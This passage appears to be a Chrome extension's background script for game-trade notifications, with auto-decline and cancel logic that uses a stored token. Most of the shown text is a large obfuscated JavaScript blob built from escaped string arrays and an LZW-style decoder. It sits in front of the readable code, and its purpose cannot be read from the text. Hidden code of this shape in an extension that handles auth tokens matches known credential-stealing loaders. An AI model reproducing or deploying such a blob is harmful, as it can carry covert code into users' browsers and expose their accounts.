0079\u0034\u0074\u0072\u0067\u0067\u0035\u006a\u005a\u0069\u0036\u0045\u0062\u006d\u0037\u0050\u0044\u0057\u0031\u0078\u0062\u0049\u0031\u0078\u006c\u004b\u005a\u0068\u0047\u0037\u0059\u0057\u0039\u0058\u005a\u0077\u0071\u0052\u0049\u0055\u0067\u0039\u006e\u0058\u0059\u0047\u0042\u0047\u006c\u006b\u0046\u0073\u0057\u0077\u0062\u0057\u0062\u0039\u0078\u006f\u0035\u004d\u0079\u0050\u006b\u0067\u006c\u007a\u0059\u0050\u0065\u0063\u0032\u0041\u0066\u0045\u0055\u006c\u0039\u0048\u0059\u006a\u0042\u0041\u0041\u0069\u0052\u0047\u004c\u0066\u0046\u0056\u0035\u0069\u006c\u0059\u0035\u0043\u0038\u0064\u006d\u0065\u0057\u006a\u0079\u0047\u0043\u004a\u0065\u004a\u0059\u0055\u004f\u007a\u0057\u006a\u0054\u0064\u0062\u0047\u006b\u0079\u0048\u0032\u007a\u0034\u004e\u006f\u0048\u0052\u0059\u006d\u0077\u004b\u0077\u004a\u0034\u0046\u0064\u0037\u0056\u0039\u0045\u0054\u0059\u0045\u0042\u005a\u0070\u0076\u0043\u006a\u0045\u0031\u004f\u0079\u0078\u0032\u0067\u0064\u006d\u004d\u0070\u0032\u004a\u0051\u0064\u0059\u006f\u0054\u0065\u0042\u0055\u005a\u0041\u0049\u0039\u004b\u004e\u0074\u005a\u0041\u0046\u0079\u0051\u006e\u0035\u0034\u006e\u0039\u0036\u0079\u0041\u0058\u0062\u0061\u0077\u0056\u004d\u004c\u0056\u0075\u0069\u0030\u0039\u0064\u004d\u0046\u006c\u006b\u0064\u004f\u004c\u006d\u0031\u0031\u0038\u004c\u0045\u0066\u0035\u0076\u006b\u0030\u0070\u0032\u0063\u004e\u0056\u0078\u0071\u0049\u0070\u0050\u006f\u0077\u0042\u0079\u0032\u0053\u006a\u0053\u0061\u0078\u0058\u0059\u0045\u0056\u006b\u004f\u0043\u005a\u0033\u006d\u0069\u0076\u0054\u0030\u0062\u005a\u0078\u0078\u0043\u0033\u0053\u0055\u0032\u0053\u0047\u0056\u0042\u006a\u004b\u0067\u006b\u0054\u0068\u0037\u0063\u0047\u0076\u0045\u0067\u004b\u0052\u0078\u0069\u0065'}if(NvptG7(0x126)in N0Hvk1N[NvptG7(0x125)]){N0Hvk1N[NvptG7(0x124)]+='\u0038\u006d\u0042\u0039\u005d\u0067א\u0049\u005e\u0038\u007e\u003dǇ\u006b\u0043;\u0039\u0031\u0066\u0038\u005e\u004b\u0063\u0070ץ\u0043̥\u004e\u0029\u003e\u0024\u0041\u0046\u0046\u0045\u0035\u0032\u0053\u0026\u004fŨ\u0038\u0021\u005a\u0062\u0061Ŏ\u0021ͮ\u0024\u006eָ׵\u0024\u004b\u0073\u0074\u0033\u006e͵ʒ\u006c\u0033\u002c\u0036\u0049\u0056\u006a\u004e\u0036\u005b\u0022\u0058\u0048\u0063\u003e\u003f\u007d\u003f\u0028\u0074\u006aͣ\u004c\u0046΍ǀ\u004d\u0064\u004b\u003eƊ\u0037\u002e\u0063\u0028\u005f\u0056\u0045\u0038\u003f\u0043˘\u004b\u0077\u0056\u0029\u0032\u0026\u0065\u0021\u0036\u006d\u002b\u0070Ȍˬ\u0026ќ\u004a\u005b\u003eĔ\u0035\u004d\u007d\u0040\u0072\u002e\u0043\u0029\u0035دϒ؆\u0055\u0057\u0055\u0035\u003d\u0040\u0023\u002c\u0060\u0065֣\u0063\u004b\u005d\u0035\u003e\u0052\u004e\u0021\u0047\u0053\u0058\u005a\u003f\u0045\u003bʵ\u004a\u005a\u0071\u006f\u0050\u0029Ճ\u0055яԕȖń\u0053\u006b\u002e\u0068\u0073\u004a؊\u0037\u0045\u0070\u007eٺ\u0022ź\u006f\u0028\u0060\u0055\u0050ύ\u0041ǒ̉Ŋ\u004c\u005aЗ\u0025\u007d\u004c\u0048\u0033\u005d\u0053\u002eրĞ\u0079\u002e\u0030\u005b\u0040Ƚ\u0033\u006f\u005a\u0045\u0078Ԉ\u002f\u0050\u0030\u0031\u0067\u006f\u006a\u003f\u0064\u005f\u0040\u002c\u004a\u0074\u0074\u007eĿƥ\u0061\u0031\u0068\u0078\u0048ł\u0042\u0022چ\u0054\u006c\u002bճ\u0056ț\u005aǑ\u0055\u003d\u0045\u0028\u0073\u002a\u003f׵\u006e\u002e\u0050\u0055\u0062\u0049Ơ\u0051\u003f\u002a\u0021\u0039\u0047\u0068Ͷֽ\u002eȗ\u0028\u0026\u007e\u0065ۏ\u0032\u0055\u004a\u0023\u0063\u004c\u0049\u003f\u005f\u005e\u003c\u004b\u0028\u004c\u006f֫\u004eە\u004c\u005e\u006a\u0056ǲ\u0052\u006a\u0059\u006f\u0032\u003b\u0063\u0033\u006c\u006f\u003b\u0022\u0044\u002c\u0044\u003a\u006e\u005aȗ\u0057\u007eԉ\u0048\u007d\u0071֤\u0063\u0066\u0032\u0037և\u006d\u0033\u0070\u0079\u004c\u0076\u0040\u0049׬\u0047\u006d\u002e\u004e\u003f\u003bŪ\u006b\u007eՏ\u0075ݑų׀\u0053\u0062\u0025ف\u0066\u0071\u003f\u0049\u0077\u0049\u004a\u0039\u0038\u0060\u0022\u005d\u0021\u0035\u0044\u0050\u0048̕ɪ\u0051ֳ\u0049ё\u006a\u0021ʚ\u003d\u0062ͮ\u0069\u0056\u006eų\u003c\u0062\u0053׹\u0048\u0028ُ\u0052\u005a\u0055\u002a\u0035\u0035\u0050͡\u0066\u0052ʫ\u003a\u004a\u0075\u005f\u0045\u0069\u0021\u0069۲ʶ\u0072ɦԡݏ\u005f\u005d\u005b\u004fȿ͙Ο\u0060\u0062\u0037\u004e\u0079\u0055ŊŃ\u007a\u0075\u004aڔ\u0043\u0048\u0026ל\u004e\u0033׋\u0060ԏ\u0021\u0070\u007aЂ\u007c\u0031ג\u006d\u007b\u0044\u0060ڗ\u005f\u007e\u003e\u0065\u003a\u005f\u006dءǱ\u0054\u0058Ơ֔\u003e\u0047\u0062\u003b\u0051\u0059\u0064\u003f\u0024\u0037\u003b\u0068ב\u002f\u0056Ɔ\u005a\u007e\u0044\u006c\u005f\u0063\u0061\u002a\u0058\u0036\u0059ʌ\u0062\u0021Ӱ\u0038\u006aܥ\u0029ɠɇ\u0045\u0033\u0055\u005a\u0068\u0069\u006d\u0050\u007aƔ\u003a\u0055\u0026\u0055\u003c٤\u003d\u0073\u004f\u0031\u004e\u0026\u0043ՍպƠ\u0035\u0026\u003eחԑ\u004e\u0060\u004b\u0074\u0046\u007d\u003bـعƧ\u0035\u0058\u002bƂ͆\u006a\u0060\u0048\u0073\u002e\u0064ݰ\u0032\u0021\u0077\u0060\u005a\u006b\u004a\u003f\u005a\u004c\u0037˼Ϭ\u0039\u006c\u0060\u003d\u002c\u006eıȗ׋ǋǷʭ\u004e\u0045\u0041\u005e\u0072\u006c\u004fǓ\u0062\u003f\u0047\u0063\u002e\u0051\u0038Ɣԝ\u0037\u0060\u0040\u0070\u0057\u0050ț࠵א\u0025Ө\u0036ǘ\u0079\u004e\u0053'}if('\x68\x63\x63\x73\x30\x44\x39\x50\x79\x59\x6c'in N0Hvk1N[NvptG7(0x125)]){N0Hvk1N[NvptG7(0x124)]+='\x49\x55Ջ\x52\x6b\x73\x44\x49\x3a\x3b\x35۴\x39\x29\x54\x59\x31\x22\x4e\x46ߞҿş\x3e݊ں\x63\x45\x60\x4a\x48Ԅ\x62\x2e\x5e\x68\x79\x6e\x29ֵ۟\x61\x6aڲ\x3dϩ\x55\x23\x7e\x34\x55\x52\x45\x5a\x22\x7a\x4aӺ\x6a\x39\x77\x28\x5d\x6e\x6c\x45\x6f\x4b\x4b\x4c\x40\x4a\x62\x5f\x64Ј\x78\x2e׼޷ŝ\x3dȗ\x30΋\x68\x64\x4eԒ\x55\x58\x77\x68ӧԾ\x61\x2e\x2fΑʠ\x5f\x73ӖԢ\x7c\x5d\x5a\x29\x65\x5f\x75Ԣ\x58\x2e\x49\x46ȕ\x7b\x48\x76ڂ\x55\x25\x39ٜ\x32\x58\x5b\x7c\x79\x62\x4dތ\x7a؈\x62\x63\x41ړ\x60\x59״ȗࡔΘ\x33\x3dࡴ\x70\x26\x78\x4f\x79\x37\x6c\x3a\x25˜ǲǯыՖ\x4d\x3a\x30ӿࣽ\x50\x6b\x59\x26ُ\x37\x55ࣉ\x4f\x39˄̈́ऎ߇ޮѬ\x50\x4c\x77\x5eۢۄԆԋ\x4a\x3dى\x58\x69\x33،\x77\x44\x5f\x23\x58\x5d\x5fԗ\x41\x58ख\x3e\x3e\x5f\x70Ӵ\x7aܕ\x66ࡻ\x31ի\x5f\x71Ơʏֵ\x48\x71\x75\x4e\x2c\x5f\x3e\x31\x7b˼ǈ\x61\x4c\x60\x74ա\x26\x76\x45ݛ\x52\x60׵\x6dǫ\x6f\x41\x7d\x61Ɏࣞ\x3f\x61Յӓ\x41ܓ\x7a\x40\x6a\x75\x53Ơ\x6fޫ\x21\x6b\x57\x3eؚ\x3f\x55\x67\x72\x35\x3f\x21\x6a\x78\x39ࢗࡽ\x3d\x67ʵ\x45\x4b\x47޶ʹ\x5f\x22\x4b\x23\x3f\x57\x49ऌ\x2cࠠ\x47Ӛ\x3eड\x7c\x40\x37स\x40ˡ\x31\x2f\x3a\x62\x6aΓࣜ\x61\x44\x53ڮ\x74\x47०\x78\x3e\x7a\x3a\x43֓\x7a\x7aƤͣ\x47\x28\x6a\x44\x71\x55\x73\x35ǜ\x6c˕\x5e\x21\x43Ͼ\x3d\x50\x63\x52\x39\x22\x73ҥ\x77ޝ\x42घˬ\x5a\x63\x21\x66\x47Ơ\x66\x78\x4d\x39࢔\x4f\x63\x3f\x3f\x58Ē\x72џ\x6fч\x79\x5d\x40ࡦ\x35\x72\x6f\x4cࣩ\x5b\x3a\x26\x61\x54\x6f\x7d\x60ՙ\x43\x69Ԃ\x4d޸\x2fל߭\x41\x63ۻܥ\x31\x2c\x3d\x56\x2f\x26\x5e\x79\x51\x41\x6a\x64\x28\x69\x77\x5f\x67\x33\x44\x44\x75ݡ\x57ॵ\x79ӕ৾\x7b͗ǇǱڍ\x6cی\x7cƮং\x50\x73\x36\x4dЪ\x3aڮ\x53Ŀ\x44\x2fدʵ\x40ǀ\x28\x5e\x44\x4b\x59\x4d\x45\x52\x77\x31\x37؃Ҙċ\x62\x77\x3bԣ\x69΃\x75\x31\x5bב\x23\x4d\x6d\x36\x3f\x34\x38\x3b\x3f\x53\x60\x47\x47ڑ\x79\x22\x6c\x64\x6b\x44յ\x3d\x2e\x26\x59\x24\x55\x60\x5f\x2a\x63ǭ\x43\x5d\x51֡\x3d\x79\x64ݶ\x54\x63\x62\x7d\x2a\x6b\x67\x56ংܙ\x22࣏ƥԛ\x6a\x6d\x44ۻ\x4b\x29\x60০\x60\x6aԻ\x42Ǚ\x6c\x7e\x58\x2c\x63ЦԞ\x3b\x59\x63\x76\x7a\x49ऀȘ\x5ĕ\x61\x75\x69\x79ڄ\x26\x46ࢣ\x71\x4e\x3c\x7a࣏\x44ϩࢄͅ\x43\x70\x2c\x50ऻ\x31٧\x7bɅ\x2cە\x7c\x6fϣ\x61\x3c\x7e\x53\x48\x2b\x23\x76ħ\x32ࣉ׀\x2bųΘ\x5b\x78\x5e\x39ԩ\x22ו\x70ȗ\x6f\x78˼'}if('\x77\x7a\x47\x6f\x62\x48\x42\x49\x73\x46'in N0Hvk1N.u9NRYW){N0Hvk1N[NvptG7(0x124)]+='\u0072\u0077\u004f\u0076\u004c\u004a\u0050\u0051\u0048\u0067\u0044\u0030\u0035\u0051\u0071\u0044\u0061\u0065\u0054\u0070\u006f\u0037\u0077\u006c\u0078\u0041\u0066\u0038\u0075\u0047\u0051\u0075\u0065\u004f\u0061\u0069\u0066\u0050\u0049\u0064\u0062\u0048\u004a\u0043\u0072\u0069\u0079\u0046\u0047\u0077\u0034\u0068\u0070\u0054\u0047\u0048\u005a\u0061\u0049\u0033\u0069\u0031\u004f\u0048\u0065\u0055\u006e\u0055\u0031\u0062\u0057\u005a\u0072\u004c\u0043\u0055\u0041\u0062\u0059\u005a\u006b\u006c\u0048\u004e\u004f\u004e\u0066\u006f\u0072\u0038\u0044\u0075\u0059\u006c\u0050\u0077\u0051\u0067\u0061\u0075\u007a\u0073\u0076\u0058\u0045\u0031\u0057\u0035\u0070\u0038\u0051\u0055\u0054\u0067\u007a\u0035\u004d\u0062\u004c\u006a\u0066\u004b\u0042\u0064\u0053\u0052\u0072\u0038\u004c\u006d\u0047\u006e\u0032\u0049\u0070\u0057\u0071\u004c\u004c\u0049\u0048\u0073\u006d\u0071\u0070\u0058\u0076\u004d\u0064\u0047\u0051\u0048\u0070\u0073\u006a\u0032\u0072\u0061\u006f\u004b\u0043\u0047\u0055\u0050\u0063\u0042\u0062\u0046\u004d\u004e\u0079\u0044\u0077\u004d\u007a\u006c\u0061\u0057\u0064\u0037\u0048\u0062\u0057\u0045\u0034\u0046\u0079\u004e\u006d\u0031\u0069\u0051\u0073\u0064\u0051\u0076\u004b\u0046\u0041\u0072\u0045\u0063\u0079\u0041\u0044\u0032\u0068\u0056\u0078\u006d\u0076\u0042\u0079\u0072\u0065\u004d\u0070\u0038\u0056\u006d\u0074\u0071\u0050\u0045\u0041\u0068\u0074\u0045\u004c\u006b\u0039\u004c\u0044\u004f\u004d\u0077\u0061\u004f\u0031\u005a\u0031\u0078\u004d\u0075\u006c\u0049\u0054\u0041\u0070\u0064\u004b\u004c\u0075\u0073\u004e\u0056\u0047\u006f\u0041\u0036\u0031\u0030\u0056\u0076\u0061\u004f\u0057\u0039\u0055\u0052\u0071\u0038\u0075\u0054\u0061\u0042\u0042\u0043\u0055\u0053\u0063\u0044\u004a\u006e\u0034\u0032\u0072\u0059\u004d\u0045\u0066\u0045\u0077\u0071\u0074\u007a\u0033\u006c\u0062\u0039\u0069\u0075\u0047\u0075\u0075\u0046\u0036\u0045\u0079\u0079\u0073\u0070\u004c\u0042\u004b\u0079\u0079\u0059\u004d\u0035\u004a\u0062\u005a\u0076\u0050\u004d\u0076\u006f\u0078\u0052\u004e\u006d\u0041\u0036\u0073\u0042\u0076\u0053\u0061\u0063\u0068\u0057\u0046\u0069\u0042\u0037\u0058\u0079\u006b\u004b\u0063\u0050\u0047\u0034\u0038\u0053\u0051\u006b\u004f\u0075\u004f\u0043\u0044\u0074\u0042\u006f\u0071\u0072\u0042\u0065\u0062\u0048\u0076\u0070\u0068\u0041\u0031\u0050\u0079\u006c\u0070\u0074\u0069\u0049\u004d\u0038\u0079\u0052\u0044\u005a\u0075\u0056\u0048\u0056\u0076\u0064\u0035\u0055\u0057\u0074\u0068\u0047\u0071\u006e\u0071\u0037\u0042\u0053\u0049\u0038\u0066\u0036\u0056\u0064\u004a\u0057\u0044\u0034\u0071\u0067\u0064\u006c\u0070\u0052\u0053\u0042\u0049\u0063\u0046\u0072\u0067\u0070\u006d\u0042\u0046\u004e\u0030\u004b\u0043\u0075\u0066\u0053\u0041\u0053\u006f\u0073\u0041\u0043\u0049\u006f\u0052\u0076\u0065\u004b\u0057\u0038\u0068\u0058\u0059\u0050\u0043\u004c\u0077\u0055\u0078\u0032\u004b\u004f\u0076\u0055\u0031\u0056\u0067\u006b\u0053\u0047\u0030\u006a\u004b\u007a\u006e\u0048\u004e\u0069\u0070\u004e\u0068\u0054\u006f\u0078\u0039\u0071\u0051\u0044\u007a\u0075\u0030\u0070\u0035\u0069\u0063\u0032\u0065\u004b\u0069\u0077\u0034\u0063\u0034\u0038\u0069\u004d\u0051\u0061\u0073\u0038\u0079\u0070\u0058\u0068\u004b\u0053\u0070\u0044\u0038\u007a\u0048\u0038\u0043\u0036\u0068\u0077\u0032\u0042\u0033\u0032\u006d\u006b\u0063\u0067\u0043\u0048\u0065\u0057\u0075\u0071\u0035\u0050\u0050\u0079\u0038\u0065\u0044\u0059\u0052\u0069\u004d\u006e\u0063\u0030\u0045\u0033\u004c\u0038\u0048\u0065\u0042\u0052\u0036\u0044\u0054\u0073\u0078\u0067\u0031\u006e\u006d\u007a\u0032\u0048\u004b\u0067\u006a\u0048\u006a\u0074\u0065\u0058\u0035\u0061\u0058\u0065\u0047\u004e\u0059\u0062\u006a\u0047\u0078\u004f\u006a\u0041\u0067\u0043\u0053\u0047\u0076\u0078\u0035\u0078\u0034\u0042\u0069\u0058\u0033\u0067\u0076\u0055\u0046\u004a\u0045\u0047\u0055\u0053\u0067\u004f\u0039\u0051\u0065\u0062\u0052\u006f\u0031\u0069\u0041\u0031'}if(NvptG7(0x127)in N0Hvk1N[NvptG7(0x125)]){N0Hvk1N[NvptG7(0x124)]+='\x4c\x56\x3aૌ\x29\x5a\x65\x54࢑\x37݀\x4c\x47\x4a\x41\x3fȗѕؽߏ\x46ݶ\x3c\x31৒ԕ\x4e\x4eǏ\x59ٷ߷\x75\x26ȋ\x55٧\x5eͣϡ\x35޶\x64\x7dƩ\x7c\x77\x2e\x57\x6b\x5dਖŎ\x23\x23\x3d\x41ֺ\x3a\x67\x22\x23\x65Ǫ\x48\x2c\x29\x72\x74ি\x68\x23Ż\x4e\x6b\x5eҥ\x74\x37ঋ\x4c\x3e\x37\x53Ө\x37\x6f֐\x3bࢦ\x48\x51গ\x65\x37\x7dȢ\x6e\x35\x24\x68\x48\x53\x42Ƃ\x35\x6a\x6b\x68ʓ\x5a\x21΍\x64\x26୓\x5f\x49Ǥ\x71\x72\x22\x70־\x23\x3a\x48\x56\x4d\x71׆\x2e\x62\x24\x63\x6c\x71\x45\x2c\x57ࡖ\x6fŊ\x37\x5dࡲںটਪ\x3b\x6e\x64\x6cݘ\x77\x39\x3eҐۏૉ\x45\x3a੸\x33ʠ֔ঌ\x25\x73\x50\x66ڡ\x7c\x45ƈϦ\x45ބʽ\x3cʗŊ\x4b\x58\x2fਮ\x7d\x5bض\x3f\x70\x3c਱\x57ӳ\x62և\x60ʝ\x59ųΆ\x31ࢢ\x50ؘۻ\x40\x79\x23\x72\x2b\x6d\x7d\x56\x40ȃݜ\x38ԫڧ\x50\x35؀Ց\x7cƌ\x25\x6e\x57\x75\x32\x79̪Ҏ\x59\x32߳\x24\x7e\x46\x3e\x3d\x47\x40\x55ŷ\x68\x36\x60\x3f\x78\x43Ć\x68\x74\x6b\x33ԃ\x7d\x2e\x40\x26ۏƤ\x69͍\x6a\x54\x55х\x69\x58\x33\x3eȔıڰ\x21ࡼֳƒ\x26ǵʚࠪԆ\x3f\x76ॵ\x48\x37\x34ٳ\x5bࣇஇ\x7c\x2a\x42Ⱦ\x35\x75\x6fפୢ\x26\x75\x7dǽ\x7c\x47࣎\x61\x72\x58ݑ\x29\x29\x2cچ\x6d\x52Һ\x39ଠԧ\x32\x45\x4dį\x71\x2e\x23\x53܉\x53Άެě\x62\x56\x59\x30\x24\x69\x3a\x2b\x45\x2b\x46\x67\x48௯\x53\x61\x2bঀǈ\x70స\x4d\x75Ơ\x5e\x70\x46\x5e\x76\x5d\x39\x55\x76\x4b\x71\x5d\x74ˍ\x7c\x4f\x29ࣕ௣\x54Ż\x5d\x7e\x52\x3d\x53ק͍\x2e\x6f\x7b\x75ߜ\x5f\x6f\x57\x76ढ़৴\x31୽š\x6a\x30\x62ƈ\x79\x24\x5eВ\x3e\x72\x44\x40ࠋ\x61\x3d\x3e\x46\x4a\x4c\x33Ŋ\x75ஆДŽ\x65\x64ਸ\x65\x74\x75\x72\x6e\x20\x74ࠉŭ\x70\x75\x73ų\x5fे৽\x74ঀ\x5fİ\x6f\x6eد\x72\x75\x63ಲŠ\x6e\x61\x6d\x65Ů\x65تನ\x7cϨ\x78\x74ૃ\x63\x6f\x64\x65Š\x55Ž\x74\x38\x41Ʈ\x61\x79\x7c\x42\x75\x66\x66೎\x7c\x53\x74żتϞೕ೗\x66৽\x6dĤ್\x50\x6f೑\x7c೦Ÿ৔఩೩ು\x6a೬\x6eϒ\x65ೋ್೮೧ˑ\x6f೟ೡ\x67\x7c\x75\x74\x66\x2dĻ\x75\x56ࢷ\x5aШŅ\x30\x51\x78\x51Өߵ\x6cƂ\x63\x59\x70೙\x42\x43\x7c\x59\x4a\x31\x41\x74\x41\x54˖\x62\x4c\x6c\x46Ӱ\x44\x6d\x69\x30\x53\x70Ĉ\x6f\x68\x72ౙŭ\x61գ\x6c೗ծ\x48ܱ΍\x78׆\x62ٿಠ\x5f\x69୅\x54Ź\x77ಾ\x74ৼ\x7aź\x33\x76\x4a\x59ŭ\x6d\x76׺\x75\x33\x7cϧࠉ\x68\x76ೞ\x51ൄ\x48\x6bಠ\x45\x34ԯ\x57Ћ\x74\x4f\x35'}if('\x6c\x4c\x35\x65'in N0Hvk1N[NvptG7(0x125)]){N0Hvk1N[NvptG7(0x124)]+='\x6f\x32'}if('\x4e\x34\x54\x4b\x35\x56'in N0Hvk1N.u9NRYW){N0Hvk1N[NvptG7(0x124)]+='\x42ȹ'}return N0Hvk1N[0xf4]}gfF_9Ui(A55Vw1T,NvptG7(0x2b));function A55Vw1T(...N0Hvk1N){SaCTO9H(N0Hvk1N[NvptG7(0x29)]=0x1,N0Hvk1N[NvptG7(0xea)]=N0Hvk1N[NvptG7(0x38)]);return q4l2E2_[N0Hvk1N[0x7d]]}function WEDs9o(SaCTO9H){var N0Hvk1N,Nx61V2U,L0PWZIS,q4l2E2_={},O1__9XP=SaCTO9H.split(''),nPC_FTK=Nx61V2U=O1__9XP[NvptG7(0x38)],XOcErbF=[nPC_FTK],cGhvFEQ=N0Hvk1N=0x100;for(SaCTO9H=NvptG7(0x2b);SaCTO9H<O1__9XP.length;SaCTO9H++)L0PWZIS=O1__9XP[SaCTO9H].charCodeAt(0x0),L0PWZIS=cGhvFEQ>L0PWZIS?O1__9XP[SaCTO9H]:q4l2E2_[L0PWZIS]?q4l2E2_[L0PWZIS]:Nx61V2U+nPC_FTK,XOcErbF.push(L0PWZIS),nPC_FTK=L0PWZIS.charAt(0x0),q4l2E2_[N0Hvk1N]=Nx61V2U+nPC_FTK,N0Hvk1N++,Nx61V2U=L0PWZIS;return XOcErbF.join('').split('\x7c')}function hZp8cMz(){return['\u006c\u0065\u006e\u0067\u0074\u0068',0x5f,0x1,0x1f,0x18,0x15,0x16,0x9,0xf0,0x4,0x1a,0x2,'\u0055\u0045\u0067\u0036\u0077\u0062',0x3d,0x1b,0x0,0x23,0x1c,0x5,0xf6,0x80,0x51,'\x77\x70\x49\x57\x51\x79\x77',0x5d,0xdf,'\u0075\u004f\u0056\u004e\u0068\u0045\u0047',0x3f,0xe3,0xf,0xfc,0x12,0x6,0x3,0xf2,0x83,0x70,0x6e,0xf5,0x13,0xa4,0x104,0x106,0x28,0x107,0x41,'\x6e\x68\x4e\x4a\x6c\x57\x47','\x72\x72\x74\x37\x33\x34\x30','\u0044\u0038\u0072\u006f\u0036\u0074','\u006c\u006a\u0062\u0045\u0043\u004f\u0044',0x5b,0xd,0xe,0xff,0x8,0x5e,0x72,0x14,0x56,0x75,'\x77\x7a\x49\x67\x43\x75\x38',void 0x0,0x2e,'\x4b\x74\x48\x79\x46\x34',0x35,0x79,0x37,0x3a,0x7,0x3e,'\u0041\u0045\u0045\u0066\u0076\u0068\u0075',0x3b,0x3c,0x1fff,'\u0042\u004a\u0053\u0049\u0035\u0038\u0074',0xae,0xce,0xb4,0x6b,0x21c,0x49,0x67,0x68,0xc,0xb,'\x63\x71\x71\x4e\x5f\x5a',0x43,0x47,0x46,0x6a,'\u0079\u0052\u004e\u0046\u0044\u0070','\u006b\u0045\u0059\u0062\u006d\u004a',0x6f,'\u0076\u0038\u0034\u0069\u0072\u0048\u0076','\u004c\u005f\u0078\u004b\u004b\u0041','\x6c\x50\x54\x54\x4e\x57',0x78,0xc5,'\u0043\u0074\u0031\u006c\u0052\u007a','\x6c\x57\x65\x66\x64\x5a\x52',0x58,0x53,0x10a,0x4a,0xa,'\x46\x52\x52\x47\x47\x37',0xea,'\x53\x48\x77\x43\x41\x63','\u006a\u0030\u0045\u0033\u0079\u0071',0x50,0x109,0x7b,0xbe,'\u0057\u005f\u006f\u0038\u0068\u0064','\u0050\u0042\u0074\u0068\u0062\u0033','\x6e\x56\x50\x6d\x4c\x4d\x4e',0x4b,'\x44\x64\x52\x47\x76\x77\x74',0x48,0x10,0x11,0x7a,0x2c,0x2d,0x21,0x17,0x10b,0x2f,!0x0,'\u0073\u0056\u0035\u006d\u0037\u0073\u0039',0xef,0x105,0x1d,'\u0064\u0045\u004a\u007a\u0035\u0050\u004d',0x1e,'\x67\x7a\x4b\x7a\x37\x53\x58',0x4c,0x39,0x20,0x54,0x59,0x22,0x34,'\u004c\u0038\u0052\u0066\u0059\u0068',0x25,0x24,0x212,0x112,0xd3,0x8a,0x87,'\u006f\u006c\u004b\u0054\u0076\u0069','\x45\x67\x48\x39\x45\x57','\u0053\u0041\u0036\u0068\u0073\u0042\u0056','\x51\x30\x49\x6b\x39\x53',0x9e,0x26,0x113,0x27,0x10d,0x19,0x240,0x32,'\u005a\u0041\u0067\u0079\u0061\u006e\u0067','\x72\x69\x31\x4b\x30\x65\x76',0x31,'\x68\x73\x63\x72\x54\x39','\x6f\x66\x51\x66\x46\x76',0x40,0x10e,'\x68\x79\x59\x63\x4a\x62\x33',0x10f,'\u007c\u007c',0x4d,0x4e,0x52,0x110,'\x61\x39\x46\x78\x6f\x72','\x75\x49\x72\x47\x44\x56',0x387,0x5c,0xeb,0xb5,0x73,'\x56\x4f\x32\x6a\x6c\x42',0x61,0xc2,!0x1,0x64,0x65,'\u0063\u0043\u0037\u0074\u0070\u0064\u0052',0xe6,'\x49\x34\x70\x6a\x44\x6c\x7a',0xa7,0x7d,'\u006e\u0059\u006b\u0043\u0047\u0045',0x23f,0x69,0x9c,0x6c,0x1c4,0x6d,0x33,0x8d,0x74,0x63,0x77,'\x6f\x6e',0x9f,'\u007a\u006a\u0050\u0068\u006e\u0051\u0042',0x7f,0x81,'\x6e\x74',0xc8,0x86,0x2a,0xc9,0x8b,0x8e,0x8f,0x90,0x85,0xb3,0x91,0x92,0xe7,0x93,0x95,0x96,0x97,0x9a,0x9b,'\x6c',0xa0,0xa1,'\x74\x65',0xa6,0x115,0xa9,0xaa,0xab,'\u0042\u004f\u0065\u0074\u0063\u0072','\x69\x58\x6e\x47\x62\x53','\u0048\u004e\u0061\u0058\u005a\u0039','\x4c\x48\x6f\x44\x31\x37','\x77\x61\x45\x30\x43\x51\x56',0xb9,0x114,0x29,'\x4a\x57\x62\x78\x78\x70\x74','\u0070\u0048\u0037\u0046\u0030\u0071\u0038','\x61\x5a\x7a\x76\x4e\x61',0xf4,'\u0075\u0039\u004e\u0052\u0059\u0057','\x77\x58\x56\x65\x64\x4e\x59\x33\x35\x4a\x64\x59','\x50\x48\x68\x6f\x74\x31\x73\x38\x68\x32\x43']}function CTd6Zv(SaCTO9H,Nx61V2U=0x0){var L0PWZIS=function(){return SaCTO9H(...arguments)};return N0Hvk1N(L0PWZIS,'\u006c\u0065\u006e\u0067\u0074\u0068',{'\x76\x61\x6c\x75\x65':Nx61V2U,'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':true})}

var notifications = {};

// setLocalStorage("cachedTrades", {});

function createNotification(notificationId, options) {
  return new Promise((resolve) => {
    chrome.notifications.create(notificationId, options, function () {
      resolve();
    });
  });
}

async function notifyTrades(trades) {
  for (var i = 0; i < trades.length; i++) {
    var trade = trades[i];
    var tradeId = Object.keys(trade)[0];
    var tradeType = trade[tradeId];
    if (!(tradeId + "_" + tradeType in tradesNotified)) {
      tradesNotified[tradeId + "_" + tradeType] = true;
      var context = "";
      var buttons = [];
      switch (tradeType) {
        case "inboundTrades":
          context = "Trade Inbound";
          buttons = [{ title: "Open" }, { title: "Decline" }];
          break;
        case "outboundTrades":
          context = "Trade Outbound";
          buttons = [{ title: "Open" }, { title: "Cancel" }];
          break;
        case "completedTrades":
          context = "Trade Completed";
          buttons = [{ title: "Open" }];
          break;
        case "inactiveTrades":
          context = "Trade Declined";
          buttons = [{ title: "Open" }];
          break;
      }
      trade = await fetchTrade(tradeId);
      var values = await fetchValues({ data: [trade] });
      var values = values[0];
      var compare = values[values["them"]] - values[values["us"]];
      var lossRatio = (1 - values[values["them"]] / values[values["us"]]) * 100;
      console.log("Trade Loss Ratio: " + lossRatio);
      if (
        context == "Trade Inbound" &&
        (await loadSettings("autoDecline")) &&
        lossRatio >= (await loadSettings("declineThreshold"))
      ) {
        console.log("Declining Trade, Trade Loss Ratio: " + lossRatio);
        cancelTrade(tradeId, await getStorage("token"));
      }
      if (
        context == "Trade Outbound" &&
        (await loadSettings("tradeProtection")) &&
        lossRatio >= (await loadSettings("cancelThreshold"))
      ) {
        console.log("Cancelling Trade, Trade Loss Ratio: " + lossRatio);
        cancelTrade(tradeId, await getStorage("token"));
      }
      if (await loadSettings("tradeNotifier")) {
        var compareText = "Win: +";
        if (compare > 0) {
          compareText = "Win: +";
        } else if (compare == 0) {
          compareText = "Equal: +";
        } else if (compare < 0) {
          compareText = "Loss: ";
        }
        var thumbnail = await fetchPlayerThumbnails([trade.user.id]);
        var options = {
          type: "basic",
          title: context,
          iconUrl: thumbnail.data[0].imageUrl,
          buttons: buttons,
          priority: 2,
          message: `Partner: ${values["them"]}\nYour Value: ${addCommas(
            values[values["us"]]
          )}\nTheir Value: ${addCommas(values[values["them"]])}`,
          contextMessage: compareText + addCommas(compare) + " Value",
          eventTime: Date.now(),
        };
        var notificationId = Math.floor(Math.random() * 10000000).toString();
        notifications[notificationId] = {
          type: "trade",
          tradeType: tradeType,
          tradeid: tradeId,
          buttons: buttons,
        };
        if (
          context != "Trade Declined" ||
          (await loadSettings("hideDeclinedNotifications")) == false
        ) {
